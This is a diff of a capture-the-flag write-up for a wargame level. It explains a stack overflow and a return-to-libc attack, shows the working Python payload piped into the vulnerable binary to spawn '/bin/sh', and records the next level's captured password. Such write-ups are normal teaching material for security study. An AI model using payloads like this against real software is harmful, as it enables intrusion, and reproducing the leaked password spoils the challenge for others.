@@ -6,10 +6,10 @@ therefore there is a possible stack overflow
 we can use it to perform a return-to-libc
 
 so we prepare the payload with the username then dummy bytes to overflow the buffer 
-then the libc's system's address, a dummy return address, and finally the string "sh" from environment variable
+then the libc's system's address, a dummy return address, and finally the string "/bin/sh" 
 
 
-level01 $> (python -c 'print "dat_wil\n"+ "A"*80 +"\xd0\xae\xe6\xf7" + "0000" + "\xde\xd8\xff\xff"'; cat) | ./level01
+level01 $> (python -c 'print "dat_wil\n"+ "A"*80 +"\xd0\xae\xe6\xf7" + "0000" + "\xec\x97\xf8\xf7"'; cat) | ./level01
 
 level02 $> cat ~level02/.pass
-
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
